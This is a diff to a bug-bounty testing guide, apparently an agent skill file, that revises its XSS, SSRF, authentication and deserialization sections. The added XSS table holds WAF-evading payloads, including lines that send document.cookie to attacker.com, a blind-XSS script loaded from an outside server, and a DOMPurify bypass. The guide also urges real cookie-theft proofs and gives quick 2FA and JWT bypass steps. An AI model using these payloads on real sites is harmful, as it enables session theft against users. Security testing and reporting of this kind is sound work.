@@ -93,33 +93,29 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 ### Cross-Site Scripting (XSS)
 
-**What it is:** Injecting client-side scripts that execute in another user's browser.
+**What it is:** Injecting client-side scripts that execute in another user's browser. XSS payouts are declining (-10% since 2023) but still pay $1K-$10K+ when chained with impact (ATO, data exfil). **Key shift in 2026:** WAFs block `alert()`, `<script>` tags, and basic event handlers. Use `print()`, `fetch()`, or PoC-specific callbacks instead.
 
-**Where to look:**
-- Search fields and results pages
-- User profile fields (name, bio, location)
-- Comment and messaging features
-- URL parameters reflected in page content
-- Error messages that include user input
-- File upload names and metadata
-- Markdown/rich text editors
+**Where to look:** Search results, user profiles (name/bio), comments, URL params reflected in HTML, error messages, file upload names, markdown editors, WYSIWYG editors, JSON/XML responses rendered in browsers, email templates with user input.
 
-**Test patterns:**
+**Test patterns (WAF-aware):**
 
 | # | Test | Payload | Context |
 |---|------|---------|---------|
-| 1 | Basic reflection | `<script>alert(1)</script>` | Unfiltered HTML context |
-| 2 | Attribute escape | `" onfocus=alert(1) autofocus="` | Inside HTML attribute |
-| 3 | Tag escape | `</title><script>alert(1)</script>` | Inside a tag |
-| 4 | Event handler | `<img src=x onerror=alert(1)>` | Image/media context |
-| 5 | SVG injection | `<svg onload=alert(1)>` | SVG-allowed context |
-| 6 | JavaScript URL | `javascript:alert(1)` | href/src attributes |
-| 7 | Template injection | `{{constructor.constructor('alert(1)')()}}` | Angular/template engines |
-| 8 | DOM-based | Check `location.hash` → `innerHTML` sinks | Client-side rendering |
-| 9 | Markdown XSS | `[click](javascript:alert(1))` | Markdown renderers |
-| 10 | CSP bypass | Check for unsafe-inline, unsafe-eval, loose whitelists | When CSP blocks basic payloads |
+| 1 | HTML context | `<img src=x onerror=print()>` | Unfiltered; `print()` bypasses most WAFs |
+| 2 | Attribute escape | `" autofocus onfocus=print() x="` | Inside quoted attribute |
+| 3 | Tag breakout | `</textarea><img src=x onerror=print()>` | Trapped in tag content |
+| 4 | SVG injection | `<svg/onload=print()>` | SVG-allowed context (no space = WAF bypass) |
+| 5 | JavaScript URI | `javascript:void(document.location='https://attacker.com/?c='+document.cookie)` | href/src (show cookie theft, not alert) |
+| 6 | DOM XSS | Audit `location.hash`/`location.search` → `innerHTML`/`document.write` sinks | SPA client-side rendering |
+| 7 | Mutation XSS | `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=print()>` | DOMPurify bypass via parser differential |
+| 8 | Template (Angular) | `{{constructor.constructor('fetch("https://attacker.com/?c="+document.cookie)')()}}` | Angular template injection |
+| 9 | Markdown XSS | `[a]("onerror="print())` or `![a]("onerror="print())` | Markdown renderers |
+| 10 | Blind XSS | `"><script src=https://your-bxss-server.com></script>` | Admin panels, support tickets, logs |
+| 11 | CSP bypass | `<base href="https://attacker.com/">` + relative script path | When CSP allows 'self'; test `base-uri` |
 
-**Framework focus:** React (`dangerouslySetInnerHTML`, SSR hydration), Angular (template injection `{{}}`, `bypassSecurityTrust*`), Vue (`v-html`), jQuery (`.html()`, `.append()` with user input). For deep DOM XSS, CSP, PostMessage: see [client-side-security](../client-side-security/SKILL.md).
+**PoC guidance:** Never use `alert(1)` in reports — demonstrate real impact. Show `document.cookie` exfiltration, session hijack, or admin action forgery. Blind XSS (test #10) is highest-ROI: inject in support tickets and wait for admin to trigger.
+
+**Framework focus:** React (`dangerouslySetInnerHTML`, SSR hydration mismatch), Angular (template injection, `bypassSecurityTrust*`), Vue (`v-html`), jQuery (`.html()`, `.append()`). For deep DOM XSS, CSP, PostMessage, XS-Leaks: see [client-side-security](../client-side-security/SKILL.md).
 
 ---
 
@@ -156,10 +152,11 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 - Azure: `169.254.169.254` with `Metadata: true` header
 
 **Recent SSRF CVEs (2025-2026):**
-- **CVE-2025-66516** (Apache Tika, CVSS 10.0): unauthenticated SSRF/XXE; primary ransomware target. Pattern: document processing libraries as SSRF entry points
-- **Hemmelig < 7.3.3**: SSRF filter bypass via DNS rebinding or open redirect services — authenticated user → internal network. Pattern: validators blocking loopback but not RFC 1918 ranges
-- **CVE-2026-27127** (Craft CMS 3.5.0-5.8.23): DNS rebinding TOCTOU in GraphQL Asset mutation; separate DNS resolution from HTTP request creates race window
-- **March 2026 SSRF cluster**: 5 SSRFs in one week (Soft Serve Git, Ghostfolio, Wallos, Plane, PinchTab) — all same root cause: validators blocking loopback but not private IPs. Test webhook, notification, and import-via-URL endpoints for private IP SSRF
+- **CVE-2025-66516** (Apache Tika, CVSS 10.0): unauthenticated SSRF/XXE; ransomware target. Pattern: document processing libraries as SSRF entry
+- **CVE-2026-27127** (Craft CMS, CVSS 3.1→High chain): DNS rebinding TOCTOU in GraphQL Asset mutation; separate DNS resolve from HTTP fetch → race window. **Variant-hunt:** any endpoint that resolves DNS then makes HTTP request in separate steps
+- **March 2026 SSRF cluster**: 5 SSRFs in one week (Soft Serve Git, Ghostfolio, Wallos, Plane, PinchTab) — same root cause: validators block `127.0.0.1` but not `10.x.x.x`/`172.16.x.x`/`192.168.x.x`. Test all webhook/notification/import-via-URL endpoints for private IP SSRF
+
+**Also check:** Unauthenticated backup/export endpoints (not SSRF but commonly adjacent) — see [infrastructure-security](../infrastructure-security/SKILL.md) for CVE-2026-27944 (Nginx UI CVSS 9.8, CWE-306) and backup appliance patterns.
 
 ---
 
@@ -193,33 +190,11 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 
 ### Authentication & Session
 
-**What it is:** Bypassing login, session management, or identity verification.
+**→ Use [auth-testing](../auth-testing/SKILL.md) for full auth/session testing.** Auth-testing owns BOLA, BFLA, JWT, OAuth, MFA bypass, session management, SSO, and SAML patterns with CVE-grounded worked examples.
 
-**Where to look:**
-- Login endpoints
-- Password reset flows
-- 2FA/MFA implementation
-- Session token handling
-- OAuth/SSO implementations
-- API key management
-- Remember-me functionality
+**Quick screen (30 seconds):** Skip 2FA step → call post-auth endpoint directly. Send Host header pointing to attacker domain in password reset. Check JWT for `alg: none`. Try `admin:admin` and manufacturer defaults. If any hit → switch to auth-testing for deep exploitation.
 
-**Test patterns:**
-
-| # | Test | What to do | What to look for |
-|---|------|-----------|-----------------|
-| 1 | Brute force | Rapid login attempts | No rate limiting or lockout |
-| 2 | Default credentials | Try common admin:admin pairs | Access granted |
-| 3 | Password reset token | Check token entropy and expiration | Predictable or long-lived tokens |
-| 4 | 2FA bypass | Skip 2FA step, go directly to post-auth endpoint | Access without 2FA |
-| 5 | Session fixation | Set session before login, check if reused after | Same session ID post-auth |
-| 6 | Token in URL | Check if tokens appear in URLs or referrer headers | Token leakage |
-| 7 | OAuth misconfiguration | Manipulate redirect_uri, state parameter | Account takeover |
-| 8 | Race condition | Send parallel requests during auth state change | Bypass checks via timing |
-| 9 | JWT issues | Check for none algorithm, weak secret, no expiry | Forged or extended tokens |
-| 10 | Password reset poisoning | Manipulate Host header in reset request | Reset link points to attacker |
-| 11 | Missing await on async auth | Check if `bcrypt.compare()` or similar async crypto is awaited | Un-awaited Promise = truthy = any password accepted (CVE-2026-28514, Rocket.Chat CVSS 9.3) |
-| 12 | Cross-app JWT acceptance | Present JWT from App A to App B with shared signing key | Full auth bypass in multi-tenant JWT systems (Parse Server < 8.6.10) |
+**2026 patterns:** Missing `await` on async auth (CVE-2026-28514, Rocket.Chat CVSS 9.3 — un-awaited `bcrypt.compare()` = any password accepted). Cross-app JWT acceptance with shared signing keys (Parse Server < 8.6.10). OAuth silent redirect abuse via `prompt=none` (ConsentFix first-party trust). JWE-wrapped PlainJWT (CVE-2026-29000 CVSS 10.0).
 
 ---
 
@@ -359,6 +334,8 @@ Not all vulnerability classes are equal. Autonomous tools (XBOW, Shannon, Codex 
 | 7 | LLM framework serialization | Test LangChain/LlamaIndex streaming/serialization paths with untrusted metadata | LangGrinch pattern: prompt cascades through deserialization to exfiltrate secrets |
 
 **Tools:** ysoserial (Java), PHPGGC (PHP), Freddy (Burp extension), SerializationDumper.
+
+**March 2026 deserialization:** CVE-2026-26114 (SharePoint Server, CVSS 8.8) — authorized user → RCE via untrusted deserialization. Affects SP 2016/2019/SE. Pattern: enterprise platforms with .NET deserialization still exploitable via authenticated access — test any SharePoint/IIS target for serialized viewstate/payload endpoints.
 
 ---
 
